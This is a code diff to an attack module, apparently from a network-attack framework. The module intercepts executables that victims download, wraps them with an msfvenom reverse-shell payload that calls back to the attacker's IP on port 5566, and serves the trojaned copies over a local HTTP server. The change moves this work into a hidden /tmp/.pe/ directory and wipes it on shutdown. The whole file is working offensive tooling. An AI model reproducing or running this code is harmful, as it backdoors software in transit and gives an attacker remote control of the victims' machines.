@@ -79,7 +79,7 @@ class pemod(Attack):
             data = urllib2.urlopen(url, ltimeout=5)
             # stream the data to a file in chunks
             CHUNK = 16 * 1024
-            with open('/tmp/%s' % bd_filename, 'wb') as f:
+            with open('/tmp/.pe/%s' % bd_filename, 'wb') as f:
                 for chunk in iter(lambda: data.read(CHUNK), ''):
                     if not chunk:
                         break
@@ -87,10 +87,10 @@ class pemod(Attack):
 
             # msfvenom it
             util.init_app('msfvenom -p %s -f exe -e x86/shikata_ga_nai '
-                          '-i 2 -k -x /tmp/%s LHOST=%s LPORT=5566 > /tmp/_%s' \
+                          '-i 2 -k -x /tmp/.pe/%s LHOST=%s LPORT=5566 > /tmp/.pe/_%s' \
                           % (self.config['payload'].opts[self.config['payload'].value-1],
                           bd_filename, config.get('ip_addr'), bd_filename))
-            util.init_app('mv /tmp/_%s /tmp/%s' % (bd_filename, bd_filename))
+            util.init_app('mv /tmp/.pe/_%s /tmp/.pe/%s' % (bd_filename, bd_filename))
 
             return True
         except Exception, e:
@@ -102,6 +102,8 @@ class pemod(Attack):
             util.Error('msvenom not found.')
             return False
 
+        # create our temporary dir
+        util.init_app('mkdir /tmp/.pe/')
         self.modip_rule()
         self.running = True
 
@@ -129,7 +131,7 @@ class pemod(Attack):
         self.hooker = Hooker(self.proxy_server, copy(self.config), self.fetch_and_backdoor)
 
         util.Msg('Spinning up an HTTP server on port 8000...')
-        self.http_server = Popen(['python', '-m', 'SimpleHTTPServer'], cwd='/tmp',
+        self.http_server = Popen(['python', '-m', 'SimpleHTTPServer'], cwd='/tmp/.pe/',
                                     stderr=STDOUT, stdout=PIPE)
         thread = Thread(target=self.hooker.run)
         thread.start()
@@ -147,6 +149,9 @@ class pemod(Attack):
         self.modip_rule(False)
         self.proxy_server.shutdown()
         self.hooker.shutdown()
+
+        # delete all the backdoored binaries
+        util.init_app('rm -fr /tmp/.pe/')
 
     def session_view(self):
         """ Return the host we're modifying
